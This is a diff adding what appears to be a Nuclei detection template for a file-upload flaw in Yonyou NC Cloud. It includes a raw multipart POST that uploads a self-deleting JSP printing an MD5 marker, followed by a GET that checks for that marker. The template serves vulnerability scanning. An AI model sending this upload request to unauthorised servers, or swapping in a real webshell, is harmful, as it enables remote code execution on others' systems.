@@ -1,0 +1,40 @@
+id: yonyou-nc-cloud-file-upload
+info:
+  name: Yonyou NC uapim/upload/grouptemplet File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou NC Cloud is a large-scale enterprise digital platform launched by Yonyou. There is a file upload vulnerability in UFIDA NC Cloud. Attackers can use the vulnerability to upload webshell and gain server privileges.
+  tags: file-upload
+http:
+  - raw:
+      - |
+        POST /uapim/upload/grouptemplet?groupid=nc&fileType=jsp&maxSize=999 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEXmnamw5gVZG9KAQ
+
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ
+        Content-Disposition: form-data; name="file"; filename="test.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTEwYWRjMzk0OWJhNTlhYmJlNTZlMDU3ZjIwZjg4M2U=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryEXmnamw5gVZG9KAQ--
+
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /uapim/static/pages/nc/head.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "e10adc3949ba59abbe56e057f20f883e"
